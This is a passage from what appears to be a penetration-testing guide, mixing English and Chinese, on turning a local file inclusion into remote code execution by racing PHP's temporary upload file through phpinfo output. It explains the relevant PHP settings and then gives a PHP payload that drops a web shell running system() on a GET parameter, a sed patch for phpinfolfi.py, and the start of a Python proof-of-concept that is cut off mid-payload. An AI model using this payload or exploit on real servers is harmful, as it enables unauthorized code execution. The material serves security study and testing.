ct the system default temp directory. max file uploads: classic PoCs usually send one real 载荷 file, but some variants add many junk file parts to bloat the response. If you exceed this limit, PHP silently drops later file parts and the 上传 you expect to race on may never appear in $ FILES. max input time: very low values can kill slow or heavily padded uploads before you win the race. enable post data reading: if Off, PHP won’t populate $ POST/$ FILES, so phpinfo() can be reachable while tmp name never appears. open basedir: if enabled, your vulnerable include path still needs to be able to reach the temp directory shown in tmp name. output buffering: 4096 is a common/default size and is why many PoCs read in 4KB chunks, but this value can differ. PHP 8.1+ may also show $ FILES ['&lt;field&gt;']['full path']. That value is submitted by the browser and may describe a client-side path or directory 上传；it is not the server temp file you must include. For this technique, always extract tmp name. # 命令 / 载荷 / 操作片段 # 1. LFI to RCE via PHPInfo 1sed -i &#x27;s/\[tmp_name\] =&gt;/\[tmp_name\] =&amp;gt;/g&#x27; phpinfolfi.py # 2. Attack workflow (step by step) 1&lt;?php file_put_contents(&#x27;/tmp/.p.php&#x27;, &#x27;&lt;?php system($_GET[&quot;x&quot;]); ?&gt;&#x27;); # 3. Minimal Python 3 PoC (socket-based) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env python3import re, html, socket, threadingHOST = &#x27;target.local&#x27;PORT = 80PHPSCRIPT = &#x27;/phpinfo.php&#x27;LFIPATH = &#x27;/vuln.php?file=%s&#x27; # sprintf-style where %s will be the tmp pathTHREADS = 10PAYLOAD = ( &quot;&lt;?php file_put_contents(&#x27;/tmp/.p.php&#x27;, &#x27;&lt;?php system($_GET[\&quot;x\&quot;]); ?&gt;&#x27;); ?&gt;
